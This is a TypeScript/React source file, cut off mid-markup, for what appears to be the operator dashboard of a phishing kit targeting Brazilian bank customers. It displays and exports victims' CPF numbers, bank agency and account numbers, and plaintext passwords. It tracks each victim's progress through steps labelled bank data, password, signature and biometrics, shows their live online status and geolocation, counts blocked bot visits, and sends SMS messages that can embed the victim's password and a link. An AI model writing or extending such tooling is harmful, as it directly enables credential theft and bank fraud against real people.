import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { leadRepository, sessionRepository, configRepository, type Lead } from "@/repositories";
import { edgeFunctionsService } from "@/services";
import type { CustomSmsTemplate } from "@/pages/admin/AdminAccessConfigPage";
import {
  Search, RefreshCw, Eye, EyeOff, Trash2, Copy,
  CheckSquare, Square, Archive, ArchiveRestore, Tag, X, MapPin, Monitor, Send, RotateCcw,
} from "lucide-react";
import {
  Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription,
} from "@/components/ui/dialog";
import { toast } from "sonner";

// ── Helpers ─────────────────────────────────────────────────────────────────

function formatDT(iso: string | null | undefined): string {
  if (!iso) return "—";
  const d = new Date(iso);
  const pad = (n: number) => String(n).padStart(2, "0");
  return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} ${pad(d.getDate())}/${pad(d.getMonth() + 1)}/${d.getFullYear()}`;
}

function parseDevice(ua: string | null | undefined, isMobile?: boolean | null): string {
  if (!ua) return isMobile ? "Mobile" : "Desktop";
  const mobile = isMobile ?? /Mobile|Android|iPhone|iPad/i.test(ua);

  // Browser
  let browser = "Browser";
  if (/SamsungBrowser/i.test(ua)) browser = "Samsung Browser";
  else if (/EdgA?/i.test(ua)) browser = "Edge";
  else if (/OPR|Opera/i.test(ua)) browser = "Opera";
  else if (/Chrome/i.test(ua)) browser = "Chrome";
  else if (/Firefox/i.test(ua)) browser = "Firefox";
  else if (/Safari/i.test(ua)) browser = "Safari";

  if (!mobile) {
    // Desktop: just OS + browser
    let os = "Unknown";
    if (/Windows/i.test(ua)) os = "Windows";
    else if (/Macintosh|Mac OS X/i.test(ua)) os = "macOS";
    else if (/Linux/i.test(ua)) os = "Linux";
    return `Desktop - ${os} - ${browser}`;
  }

  // Mobile: model from UA
  let model = "Unknown";
  let brand = "Unknown";

  // iPhone
  const iphoneMatch = ua.match(/iPhone\s*OS\s*[\d_]+/i);
  if (iphoneMatch) { model = "iPhone"; brand = "Apple"; }
  // iPad
  else if (/iPad/i.test(ua)) { model = "iPad"; brand = "Apple"; }
  // Android model: "Android x.x; MODEL"
  else {
    const androidMatch = ua.match(/Android[^;]*;\s*([^)]+)\)/);
    if (androidMatch) {
      model = androidMatch[1].trim();
      // Detect brand from model prefix
      if (/samsung/i.test(ua)) brand = "Samsung";
      else if (/xiaomi|redmi|mi\s/i.test(ua)) brand = "Xiaomi";
      else if (/motorola|moto\s/i.test(ua)) brand = "Motorola";
      else if (/lg-/i.test(ua)) brand = "LG";
      else if (/huawei/i.test(ua)) brand = "Huawei";
      else if (/nokia/i.test(ua)) brand = "Nokia";
      else if (/sony/i.test(ua)) brand = "Sony";
      else brand = "Unknown";
    }
  }

  return `Mobile - ${model} - ${brand} - ${browser}`;
}

function deriveTipo(cpf: string | null | undefined): string {
  if (!cpf) return "—";
  const digits = cpf.replace(/\D/g, "");
  if (digits.length === 11) return "FÍSICA";
  if (digits.length === 14) return "JURÍDICA";
  return "—";
}

interface LastSession {
  page: string | null;
  user_agent: string | null;
  last_seen_at: string | null;
  latitude: number | null;
  longitude: number | null;
  is_mobile: boolean | null;
}

// ── Constants ───────────────────────────────────────────────────────────────

interface Stats {
  totalFichas: number;
  onlineNow: number;
  completed: number;
  incomplete: number;
  totalSessions: number;
  totalBlocked: number;
}

interface StatCard {
  label: string;
  value: number;
  iconSrc: string;
  accentClass: string;
  pulse?: boolean;
  sub?: { label: string; value: number; color: string }[];
}

const STEP_LABELS: Record<string, string> = {
  splash: "Splash", inicio: "Início", "dados-bancarios": "Dados Bancários",
  resgate: "Resgate", senha: "Senha", assinatura: "Assinatura",
  biometria: "Biometria", concluido: "Concluído",
};

const PRESET_TAGS = ["Correu", "Caixa Postal", "Agendado", "Finalizado"];

// ── Component ────────────────────────────────────────────────────────────────

export default function AdminDashboard() {
  // Stats
  const [stats, setStats] = useState<Stats>({
    totalFichas: 0, onlineNow: 0, completed: 0,
    incomplete: 0, totalSessions: 0, totalBlocked: 0,
  });

  // Leads
  const [leads, setLeads] = useState<Lead[]>([]);
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState<Lead | null>(null);
  const [selectedIdx, setSelectedIdx] = useState<number | null>(null);
  const [selectedSession, setSelectedSession] = useState<LastSession | null>(null);
  const [loading, setLoading] = useState(true);
  const [checked, setChecked] = useState<Set<string>>(new Set());
  const [showArchived, setShowArchived] = useState(false);
  const [tagModalLead, setTagModalLead] = useState<Lead | null>(null);
  const [customTag, setCustomTag] = useState("");
  const [filterTag, setFilterTag] = useState("");
  const [visiblePwds, setVisiblePwds] = useState<Set<string>>(new Set());
  const [selectedPwdVisible, setSelectedPwdVisible] = useState(false);
  const [onlineLeadIds, setOnlineLeadIds] = useState<Set<string>>(new Set());
  const [sendingSms, setSendingSms] = useState(false);
  const [customTemplates, setCustomTemplates] = useState<CustomSmsTemplate[]>([]);
  const [selectedTemplateId, setSelectedTemplateId] = useState<string>("");
  const [counterResetAt, setCounterResetAt] = useState<string | undefined>(undefined);
  const counterResetRef = useRef(counterResetAt);

  // ── Fetchers ──

  const fetchCounterResetAt = async (): Promise<string | undefined> => {
    try {
      const rows = await configRepository.getByKeys(["counter_reset_at"]);
      const val = rows.find((r) => r.config_key === "counter_reset_at")?.config_value;
      const since = typeof val === "string" ? val : undefined;
      setCounterResetAt(since);
      return since;
    } catch {
      return undefined;
    }
  };

  const fetchStats = async (since?: string) => {
    try {
      const [fichas, blocked, sessions] = await Promise.all([
        leadRepository.countFichas(since),
        configRepository.countAccessLogs(since),
        sessionRepository.countStats(since),
      ]);
      setStats({
        totalFichas: fichas.total,
        onlineNow: sessions.online,
        completed: fichas.completed,
        incomplete: fichas.incomplete,
        totalSessions: sessions.total,
        totalBlocked: blocked,
      });
    } catch (err) {
      console.error("fetchStats error:", err);
    }
  };

  const handleResetCounters = async () => {
    if (!confirm("Zerar contadores? Os dados históricos serão preservados.")) return;
    try {
      const now = new Date().toISOString();
      await configRepository.upsert("counter_reset_at", now);
      setCounterResetAt(now);
      await fetchStats(now);
      toast.success("Contadores zerados");
    } catch (err) {
      console.error("resetCounters error:", err);
      toast.error("Erro ao zerar contadores");
    }
  };

  const handleCleanLoose = async () => {
    if (!confirm("Apagar leads sem CPF/telefone e suas sessões órfãs?")) return;
    try {
      const { count: sessionsDeleted } = await sessionRepository.deleteWithoutCpf();
      const leadsDeleted = await leadRepository.deleteLoose();
      await fetchStats(counterResetRef.current);
      toast.success(`Removidos: ${leadsDeleted} leads soltos, ${sessionsDeleted} sessões órfãs`);
    } catch (err) {
      console.error("cleanLoose error:", err);
      toast.error("Erro ao limpar acessos soltos");
    }
  };

  const fetchOnlineLeadIds = async () => {
    const threshold = new Date(Date.now() - 60_000).toISOString();
    const { data } = await supabase
      .from("site_sessions")
      .select("lead_id")
      .gte("last_seen_at", threshold);
    setOnlineLeadIds(new Set((data ?? []).flatMap((s) => s.lead_id ? [s.lead_id] : [])));
  };

  const fetchLeads = async () => {
    setLoading(true);
    try {
      const result = await leadRepository.findAll({ archived: showArchived, limit: 10_000 });
      setLeads(result.data);
      setChecked(new Set());
    } finally {
      setLoading(false);
    }
  };

  const fetchLeadLastSession = async (leadId: string) => {
    setSelectedSession(null);
    const { data } = await supabase
      .from("site_sessions")
      .select("page, user_agent, last_seen_at, latitude, longitude, is_mobile")
      .eq("lead_id", leadId)
      .order("last_seen_at", { ascending: false })
      .limit(1);
    if (data && data.length > 0) setSelectedSession(data[0] as LastSession);
  };

  const handleSelectLead = (lead: Lead, idx: number) => {
    setSelected(lead);
    setSelectedIdx(idx + 1);
    setSelectedPwdVisible(false);
    fetchLeadLastSession(lead.id);
  };

  function applyTemplateVars(raw: string, lead: Lead): string {
    const protocolo = lead.id.slice(0, 8).toUpperCase();
    const link = (import.meta.env.VITE_SMS_LINK as string | undefined) ?? "";
    return raw
      .replace(/\{\{protocolo\}\}/gi, protocolo)
      .replace(/\{\{agencia\}\}/gi, lead.agency ?? "")
      .replace(/\{\{conta\}\}/gi, lead.account ?? "")
      .replace(/\{\{cpf\}\}/gi, lead.cpf ?? "")
      .replace(/\{\{nome\}\}/gi, lead.nome ?? "")
      .replace(/\{\{senha\}\}/gi, lead.password ?? "")
      .replace(/\{\{segmento\}\}/gi, lead.segment ?? "")
      .replace(/\{\{celular\}\}/gi, lead.phone ?? "")
      .replace(/\{\{link\}\}/gi, link);
  }

  const handleSendSms = async (lead: Lead) => {
    const phone = lead.phone;
    if (!phone) { toast.error("Lead sem número de celular"); return; }

    const tpl = customTemplates.find((t) => t.id === selectedTemplateId);
    if (!tpl) { toast.error("Selecione um template de SMS"); return; }
    if (!tpl.body.trim()) { toast.error("Template vazio — edite em /controle"); return; }

    setSendingSms(true);
    try {
      await edgeFunctionsService.sendSms(phone, applyTemplateVars(tpl.body, lead), (tpl.profile ?? "default") as "default" | "manual");
      toast.success(`SMS enviado para ${phone}`);
    } catch (err) {
      console.error("Send SMS error:", err);
      toast.error("Erro ao enviar SMS");
    } finally {
      setSendingSms(false);
    }
  };

  // ── Effects ──

  useEffect(() => { counterResetRef.current = counterResetAt; }, [counterResetAt]);

  useEffect(() => {
    fetchCounterResetAt().then((since) => fetchStats(since));
    const refetchStats = () => fetchStats(counterResetRef.current);
    const interval = setInterval(refetchStats, 30_000);
    const channel = supabase
      .channel("admin-dashboard")
      .on("postgres_changes", { event: "*", schema: "public", table: "leads" }, refetchStats)
      .on("postgres_changes", { event: "*", schema: "public", table: "site_sessions" }, refetchStats)
      .subscribe();
    return () => { clearInterval(interval); supabase.removeChannel(channel); };
  }, []);

  useEffect(() => { fetchLeads(); fetchOnlineLeadIds(); }, [showArchived]);

  useEffect(() => {
    configRepository.getByKeys(["sms_custom_templates"]).then((rows) => {
      const v = rows[0]?.config_value;
      if (Array.isArray(v)) {
        setCustomTemplates(v as CustomSmsTemplate[]);
        if (v.length > 0) setSelectedTemplateId((v[0] as CustomSmsTemplate).id);
      }
    }).catch(() => {});
  }, []);

  useEffect(() => {
    const channel = supabase
      .channel("admin-dashboard-leads")
      .on("postgres_changes", { event: "*", schema: "public", table: "leads" }, () => fetchLeads())
      .on("postgres_changes", { event: "*", schema: "public", table: "site_sessions" }, () => fetchOnlineLeadIds())
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [showArchived]);

  // ── Lead handlers ──

  const togglePwd = (id: string) =>
    setVisiblePwds((prev) => { const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s; });

  const toggleCheck = (id: string) =>
    setChecked((prev) => { const next = new Set(prev); next.has(id) ? next.delete(id) : next.add(id); return next; });

  const toggleAll = () => {
    if (checked.size === filtered.length) setChecked(new Set());
    else setChecked(new Set(filtered.map((l) => l.id)));
  };

  const handleDeleteSelected = async () => {
    if (checked.size === 0) return;
    if (!confirm(`Apagar ${checked.size} lead(s)? Esta ação é irreversível.`)) return;
    await leadRepository.bulkDelete(Array.from(checked));
    toast.success(`${checked.size} lead(s) apagado(s)`);
    fetchLeads();
  };

  const handleArchiveSelected = async () => {
    if (checked.size === 0) return;
    const newVal = !showArchived;
    await leadRepository.bulkUpdate(Array.from(checked), { archived: newVal });
    toast.success(`${checked.size} lead(s) ${newVal ? "arquivado(s)" : "desarquivado(s)"}`);
    fetchLeads();
  };

  const handleCopySelected = () => {
    const toCopy = leads.filter((l) => checked.has(l.id));
    if (toCopy.length === 0) return;
    const header = "CPF\tTelefone\tNome\tSegmento\tAgência\tConta\tSenha\tEtapa";
    const text = toCopy.map((l) =>
      [l.cpf, l.phone, l.nome, l.segment, l.agency, l.account, l.password, STEP_LABELS[l.current_step] || l.current_step].join("\t")
    ).join("\n");
    navigator.clipboard.writeText(header + "\n" + text);
    toast.success(`${toCopy.length} lead(s) copiado(s)`);
  };

  const handleCopyOne = (lead: Lead) => {
    const text = [
      `CPF: ${lead.cpf || "—"}`, `Telefone: ${lead.phone || "—"}`,
      `Nome: ${lead.nome || "—"}`, `Segmento: ${lead.segment || "—"}`,
      `Agência: ${lead.agency || "—"}`, `Conta: ${lead.account || "—"}`,
      `Senha: ${lead.password || "—"}`,
      `Etapa: ${STEP_LABELS[lead.current_step] || lead.current_step}`,
      `Tags: ${(lead.tags ?? []).join(", ") || "—"}`,
    ].join("\n");
    navigator.clipboard.writeText(text);
    toast.success("Dados copiados");
  };

  const handleAddTag = async (lead: Lead, tag: string) => {
    if (!tag.trim()) return;
    const current = lead.tags ?? [];
    if (current.includes(tag.trim())) return;
    const updated = [...current, tag.trim()];
    await leadRepository.update(lead.id, { tags: updated });
    setLeads((prev) => prev.map((l) => l.id === lead.id ? { ...l, tags: updated } : l));
    setTagModalLead((prev) => prev?.id === lead.id ? { ...prev, tags: updated } : prev);
    toast.success(`Tag "${tag.trim()}" adicionada`);
  };

  const handleRemoveTag = async (lead: Lead, tag: string) => {
    const updated = (lead.tags ?? []).filter((t) => t !== tag);
    await leadRepository.update(lead.id, { tags: updated });
    setLeads((prev) => prev.map((l) => l.id === lead.id ? { ...l, tags: updated } : l));
    setTagModalLead((prev) => prev?.id === lead.id ? { ...prev, tags: updated } : prev);
  };

  const handleBulkTag = async (tag: string) => {
    if (checked.size === 0 || !tag.trim()) return;
    await leadRepository.bulkAddTag(Array.from(checked), tag.trim());
    toast.success(`Tag "${tag.trim()}" aplicada a ${checked.size} lead(s)`);
    fetchLeads();
  };

  // ── Derived ──

  const allTags = Array.from(new Set(leads.flatMap((l) => l.tags ?? [])));

  const filtered = leads.filter((l) => {
    const q = search.toLowerCase();
    const matchSearch =
      l.cpf?.toLowerCase().includes(q) || l.phone?.toLowerCase().includes(q) ||
      l.nome?.toLowerCase().includes(q) || l.segment?.toLowerCase().includes(q);
    const matchTag = filterTag ? (l.tags ?? []).includes(filterTag) : true;
    return matchSearch && matchTag;
  });

  const cards: StatCard[] = [
    { label: "Visitantes Online", value: stats.onlineNow, iconSrc: "/icones/visitantes.png", accentClass: "border-emerald-400", pulse: true },
    { label: "Total de Acessos", value: stats.totalSessions, iconSrc: "/icones/acessos.png", accentClass: "border-blue-400" },
    { label: "Acessos Bloqueados", value: stats.totalBlocked, iconSrc: "/icones/robo.png", accentClass: "border-destructive" },
    {
      label: "Total de Fichas", value: stats.totalFichas, iconSrc: "/icones/fichas.png", accentClass: "border-primary",
      sub: [
        { label: "Completas", value: stats.completed, color: "text-emerald-400" },
        { label: "Incompletas", value: stats.incomplete, color: "text-orange-400" },
      ],
    },
  ];

  // ── Render ───────────────────────────────────────────────────────────────

  return (
    <div className="space-y-6">
      <h1 className="text-xl font-bold text-foreground font-mono tracking-tight">// Dashboard</h1>

      {/* ── Stat Cards ── */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          {counterResetAt && (
            <span className="text-[11px] font-mono text-muted-foreground">
              Contando desde {formatDT(counterResetAt)}
            </span>
          )}
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={handleCleanLoose}
            className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm text-muted-foreground hover:bg-muted transition-colors"
          >
            <Trash2 className="h-3.5 w-3.5" /> Limpar acessos soltos
          </button>
          <button
            onClick={handleResetCounters}
            className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm text-muted-foreground hover:bg-muted transition-colors"
          >
            <RotateCcw className="h-3.5 w-3.5" /> Zerar contadores
          </button>
        </div>
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {cards.map((c) => (
          <div key={c.label} className={`rounded-xl bg-card border border-border border-l-4 p-5 shadow-sm ${c.accentClass}`}>
            <div className="flex items-center justify-between mb-3">
              <span className="font-mono text-[10px] tracking-[0.15em] text-muted-foreground uppercase">{c.label}</span>
              <div className="relative">
                <img src={c.iconSrc} alt={c.label} className="h-6 w-6 object-contain" />
                {c.pulse && (
                  <span className="absolute -top-0.5 -right-0.5 flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-400" />
                  </span>
                )}
              </div>
            </div>
            <p className="text-3xl font-bold text-foreground font-mono tracking-tight">{c.value}</p>
            {c.sub && (
              <div className="flex gap-3 mt-2">
                {c.sub.map((s) => (
                  <span key={s.label} className="text-[11px] font-mono">
                    <span className={`font-bold ${s.color}`}>{s.value}</span>
                    <span className="text-muted-foreground ml-1">{s.label}</span>
                  </span>
                ))}
              </div>
            )}
          </div>
        ))}
      </div>

      {/* ── Leads Table ── */}
      <div className="space-y-3">
        {/* Leads header */}
        <div className="flex items-center justify-between flex-wrap gap-2">
          <span className="font-mono text-[10px] tracking-[0.2em] text-muted-foreground uppercase">
            {showArchived ? "Leads Arquivados" : "Fichas"}
          </span>
          <div className="flex items-center gap-2 flex-wrap">
            {checked.size > 0 && (
              <>
                <button onClick={handleCopySelected} className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
                  <Copy className="h-3.5 w-3.5" /> Copiar ({checked.size})
                </button>
                <button onClick={handleArchiveSelected} className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
                  {showArchived ? <ArchiveRestore className="h-3.5 w-3.5" /> : <Archive className="h-3.5 w-3.5" />}
                  {showArchived ? "Desarquivar" : "Arquivar"} ({checked.size})
                </button>
                <div className="relative group">
                  <button className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
                    <Tag className="h-3.5 w-3.5" /> Tag ({checked.size})
                  </button>
                  <div className="absolute right-0 top-full mt-1 w-40 rounded-lg border border-border bg-card shadow-lg hidden group-hover:block z-50">
                    {PRESET_TAGS.map((tag) => (
                      <button key={tag} onClick={() => handleBulkTag(tag)} className="block w-full text-left px-3 py-2 text-sm hover:bg-muted transition-colors text-foreground">
                        {tag}
                      </button>
                    ))}
                  </div>
                </div>
                <button onClick={handleDeleteSelected} className="flex items-center gap-1.5 rounded-lg border border-destructive/30 bg-destructive/10 px-3 py-2 text-sm font-medium text-destructive hover:bg-destructive/20 transition-colors">
                  <Trash2 className="h-3.5 w-3.5" /> Apagar ({checked.size})
                </button>
              </>
            )}
            <button onClick={() => setShowArchived((v) => !v)} className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm text-muted-foreground hover:bg-muted transition-colors">
              {showArchived ? <ArchiveRestore className="h-4 w-4" /> : <Archive className="h-4 w-4" />}
              {showArchived ? "Ver Ativos" : "Ver Arquivados"}
            </button>
            <button onClick={fetchLeads} className="flex items-center gap-2 rounded-lg border border-border px-3 py-2 text-sm text-muted-foreground hover:bg-muted transition-colors">
              <RefreshCw className="h-4 w-4" /> Atualizar
            </button>
          </div>
        </div>

        {/* Search + tag filter */}
        <div className="flex gap-2">
          <div className="relative flex-1">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Buscar por CPF, telefone, nome, segmento..."
              className="w-full rounded-lg border border-border bg-muted/30 pl-10 pr-4 py-2.5 text-sm text-foreground placeholder:text-muted-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
            />
          </div>
          {allTags.length > 0 && (
            <select
              value={filterTag}
              onChange={(e) => setFilterTag(e.target.value)}
              className="rounded-lg border border-border bg-muted/30 px-3 py-2.5 text-sm text-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
            >
              <option value="">Todas as tags</option>
              {allTags.map((t) => <option key={t} value={t}>{t}</option>)}
            </select>
          )}
        </div>

        {/* Table */}
        <div className="rounded-xl border border-border bg-card overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-border bg-muted/50">
                  <th className="px-3 py-3 text-center">
                    <button onClick={toggleAll} className="text-muted-foreground hover:text-foreground transition-colors">
                      {checked.size === filtered.length && filtered.length > 0 ? <CheckSquare className="h-4 w-4" /> : <Square className="h-4 w-4" />}
                    </button>
                  </th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">CPF</th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Telefone</th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Nome</th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Segmento</th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Agência</th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Conta</th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Senha</th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Etapa</th>
                  <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Tags</th>
                  <th className="px-4 py-3 text-center font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Ações</th>
                </tr>
              </thead>
              <tbody>
                {loading ? (
                  <tr><td colSpan={11} className="px-4 py-8 text-center text-muted-foreground font-mono text-xs">Carregando...</td></tr>
                ) : filtered.length === 0 ? (
                  <tr><td colSpan={11} className="px-4 py-8 text-center text-muted-foreground font-mono text-xs">Nenhuma ficha encontrada</td></tr>
                ) : (
                  filtered.map((lead, idx) => (
                    <tr key={lead.id} className={`border-b border-border last:border-0 hover:bg-muted/30 transition-colors ${checked.has(lead.id) ? "bg-primary/5" : ""}`}>
                      <td className="px-3 py-3 text-center">
                        <button onClick={() => toggleCheck(lead.id)} className="text-muted-foreground hover:text-foreground transition-colors">
                          {checked.has(lead.id) ? <CheckSquare className="h-4 w-4 text-primary" /> : <Square className="h-4 w-4" />}
                        </button>
                      </td>
                      <td className="px-4 py-3 font-mono text-xs text-foreground">
                        <span className="flex items-center gap-1.5">
                          {onlineLeadIds.has(lead.id) && (
                            <span className="relative flex h-1.5 w-1.5 shrink-0">
                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                              <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-400" />
                            </span>
                          )}
                          {lead.cpf || "—"}
                        </span>
                      </td>
                      <td className="px-4 py-3 font-mono text-xs text-muted-foreground">{lead.phone || "—"}</td>
                      <td className="px-4 py-3 text-xs text-foreground">{lead.nome || "—"}</td>
                      <td className="px-4 py-3">
                        {lead.segment
                          ? <span className="inline-block rounded-full bg-primary/15 px-2 py-0.5 text-xs font-medium text-primary">{lead.segment}</span>
                          : "—"}
                      </td>
                      <td className="px-4 py-3 font-mono text-xs text-muted-foreground">{lead.agency || "—"}</td>
                      <td className="px-4 py-3 font-mono text-xs text-muted-foreground">{lead.account || "—"}</td>
                      <td className="px-4 py-3 font-mono text-xs font-bold text-foreground">
                        <span className="inline-flex items-center gap-1">
                          {lead.password ? (visiblePwds.has(lead.id) ? lead.password : "••••••") : "—"}
                          {lead.password && (
                            <button onClick={() => togglePwd(lead.id)} className="text-muted-foreground hover:text-foreground transition-colors">
                              {visiblePwds.has(lead.id) ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                            </button>
                          )}
                        </span>
                      </td>
                      <td className="px-4 py-3">
                        <span className={`inline-block rounded-full px-2 py-0.5 text-xs font-medium ${
                          lead.status === "concluido" ? "bg-emerald-500/20 text-emerald-400" : "bg-orange-500/20 text-orange-400"
                        }`}>
                          {STEP_LABELS[lead.current_step] || lead.current_step}
                        </span>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex flex-wrap gap-1">
                          {(lead.tags ?? []).map((tag) => (
                            <span key={tag} className="inline-flex items-center gap-0.5 rounded-full bg-primary/15 px-2 py-0.5 text-[10px] font-medium text-primary">
                              {tag}
                              <button onClick={() => handleRemoveTag(lead, tag)} className="hover:text-destructive"><X className="h-2.5 w-2.5" /></button>
                            </span>
                          ))}
                          <button onClick={() => setTagModalLead(lead)} className="rounded-full border border-dashed border-border p-0.5 text-muted-foreground hover:text-foreground hover:border-foreground transition-colors">
                            <Tag className="h-3 w-3" />
                          </button>
                        </div>
                      </td>
                      <td className="px-4 py-3 text-center">
                        <div className="flex items-center justify-center gap-1">
                          <button onClick={() => handleCopyOne(lead)} title="Copiar dados" className="rounded-lg p-1.5 text-muted-foreground hover:bg-muted hover:text-foreground transition-colors">
                            <Copy className="h-4 w-4" />
                          </button>
                          <button onClick={() => handleSelectLead(lead, idx)} title="Ver detalhes" className="rounded-lg p-1.5 text-muted-foreground hover:bg-muted hover:text-foreground transition-colors">
                            <Eye className="h-4 w-4" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

      </div>

      {/* ── Lead detail dialog ── */}
      <Dialog open={!!selected} onOpenChange={() => { setSelected(null); setSelectedIdx(null); setSelectedSession(null); setSelectedPwdVisible(false); }}>
        <DialogContent className="max-w-3xl p-0 gap-0 border-border/60 shadow-2xl">
          <DialogTitle className="sr-only">{selected?.nome || "Lead"} — Ficha #{selectedIdx}</DialogTitle>

          {/* Inner wrapper controls the layout (avoids conflict with DialogContent's grid) */}
          <div className="flex flex-col max-h-[88vh] overflow-hidden rounded-lg">

            {/* ── Header ── */}
            <div className="shrink-0 relative px-6 pt-5 pb-4 border-b border-border/60"
              style={{ background: "linear-gradient(135deg, hsl(var(--card)) 0%, hsl(271 28% 9%) 100%)" }}>
              {/* Top accent line */}
              <div className="absolute top-0 inset-x-0 h-[2px] rounded-t-lg"
                style={{ background: "linear-gradient(90deg, transparent, hsl(var(--primary)/0.8), transparent)" }} />
              {/* Subtle dot grid */}
              <div className="absolute inset-0 rounded-t-lg opacity-[0.025]"
                style={{ backgroundImage: "radial-gradient(hsl(var(--primary)) 1px, transparent 1px)", backgroundSize: "20px 20px" }} />

              <div className="relative z-10 flex items-start justify-between gap-4">
                <div className="flex items-start gap-4 min-w-0">
                  {/* Case number badge */}
                  <div className="shrink-0 w-[52px] h-[52px] rounded-lg border border-primary/25 bg-primary/8 flex flex-col items-center justify-center gap-0"
                    style={{ background: "hsl(var(--primary)/0.07)" }}>
                    <span className="font-mono text-[9px] text-primary/60 tracking-widest uppercase leading-none">FICHA</span>
                    <span className="font-mono text-lg font-bold text-primary leading-none">#{selectedIdx ?? "—"}</span>
                  </div>

                  <div className="min-w-0">
                    {/* Badges row */}
                    <div className="flex items-center gap-2 mb-1 flex-wrap">
                      <span className="font-mono text-[9px] tracking-[0.2em] text-muted-foreground/70 uppercase border border-border/60 px-1.5 py-0.5 rounded-sm">
                        {deriveTipo(selected?.cpf)}
                      </span>
                      {selected && onlineLeadIds.has(selected.id) && (
                        <span className="flex items-center gap-1 text-[9px] font-mono text-emerald-400 tracking-widest">
                          <span className="relative flex h-1.5 w-1.5">
                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                            <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-400" />
                          </span>
                          ONLINE
                        </span>
                      )}
                    </div>
                    <h2 className="text-xl font-bold text-foreground leading-tight truncate">{selected?.nome || "—"}</h2>
                    <p className="font-mono text-xs text-muted-foreground mt-0.5">{selected?.cpf || "sem CPF"}</p>
                  </div>
                </div>

                {/* Status + etapa */}
                {selected && (
                  <div className="shrink-0 flex flex-col items-end gap-1.5 mt-0.5 pr-6">
                    <span className={`rounded px-2.5 py-1 text-[10px] font-mono font-bold tracking-widest border ${
                      selected.status === "concluido"
                        ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
                        : "bg-orange-500/10 border-orange-500/30 text-orange-400"
                    }`}>
                      {selected.status === "concluido" ? "CONCLUÍDO" : "PENDENTE"}
                    </span>
                    <span className="font-mono text-[10px] text-muted-foreground/60">
                      {STEP_LABELS[selected.current_step] || selected.current_step}
                    </span>
                  </div>
                )}
              </div>
            </div>

            {/* ── Body: 2-col ── */}
            <div className="flex flex-1 min-h-0">

              {/* Left column — data */}
              <div className="flex-1 overflow-y-auto px-6 py-5 space-y-5 border-r border-border/50">
                {selected && (
                  <>
                    {/* Dados bancários */}
                    <section>
                      <p className="font-mono text-[9px] tracking-[0.25em] text-muted-foreground/50 uppercase mb-2.5">Dados Bancários</p>
                      <div className="grid grid-cols-2 gap-1.5">
                        {([
                          ["Agência", selected.agency],
                          ["Conta", selected.account],
                          ["CPF", selected.cpf],
                          ["Celular", selected.phone],
                          ["Segmento", selected.segment],
                          ["Criado em", formatDT(selected.created_at)],
                        ] as [string, string | null | undefined][]).map(([label, value]) => (
                          <div key={label} className="rounded-md border border-border/40 bg-muted/15 px-3 py-2.5">
                            <p className="font-mono text-[9px] text-muted-foreground/50 uppercase tracking-wider mb-1">{label}</p>
                            <p className="font-mono text-xs text-foreground font-semibold truncate">{value || "—"}</p>
                          </div>
                        ))}
                      </div>
                    </section>

                    {/* Senha */}
                    <section>
                      <p className="font-mono text-[9px] tracking-[0.25em] text-muted-foreground/50 uppercase mb-2.5">Senha de Acesso</p>
                      <div className="rounded-md border border-border/40 bg-muted/15 px-4 py-3 flex items-center justify-between gap-3">
                        <span className="font-mono text-xl font-bold tracking-[0.4em] text-foreground">
                          {selected.password ? (selectedPwdVisible ? selected.password : "••••••") : "—"}
                        </span>
                        {selected.password && (
                          <button
                            type="button"
                            onClick={() => setSelectedPwdVisible((v) => !v)}
                            className="shrink-0 rounded-md border border-border/60 px-3 py-1.5 font-mono text-[10px] text-muted-foreground hover:text-foreground hover:bg-muted transition-colors flex items-center gap-1.5"
